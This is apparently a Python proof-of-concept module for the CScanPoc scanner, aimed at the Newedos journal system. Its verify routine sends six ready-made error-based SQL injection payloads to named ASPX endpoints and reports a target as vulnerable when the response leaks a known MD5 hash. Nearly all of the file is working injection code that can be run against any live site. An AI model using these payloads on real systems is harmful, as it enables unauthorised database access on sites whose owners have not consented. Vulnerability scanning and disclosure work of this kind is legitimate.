# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Newedos_0002' # 平台漏洞编号，留空
    name = '菲斯特诺期刊系统5处SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-10-08'  # 漏洞公布时间
    desc = '''
        菲斯特诺期刊系统5处SQL注入漏洞：
        /showunit.aspx?classid=1&newsid=1
        /CompanyList.aspx?parentid=1
        /supplyproduct.aspx?cid=1
        /viewmulu.aspx?qi_id=0&preqi_id=
        /ExhibitionCenter.aspx?area=-1'
        /select_jianli.aspx
    ''' # 漏洞描述
    ref = '' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0125186
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'Newedos(菲斯特诺期刊系统)'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'newedos_0006' # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-22' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            ps=[
                "/showunit.aspx?classid=1&newsid=1%20and/**/1=char(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27)))/**/%20--%20",
                "/CompanyList.aspx?parentid=1/**/and/**/1=char(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27)))/**/&&classid=1",
                "/supplyproduct.aspx?cid=1%20and/**/1=char(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27)))/**/%20--%20",
                "/viewmulu.aspx?qi_id=0&preqi_id=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))&mid=23292&xuhao=56 ",
                "/ExhibitionCenter.aspx?area=-1'%20and/**/1=char(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27)))/**/%20--%20",
                "/select_jianli.aspx?type=workto&content=1%27/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))/**/and/**/%27%%27=%27"
                ]
            for p in ps:
                url=arg+p
                code, head, res, errcode, _ = hh.http(url)
                
                if code==500 and "c4ca4238a0b923820dcc509a6f75849b" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()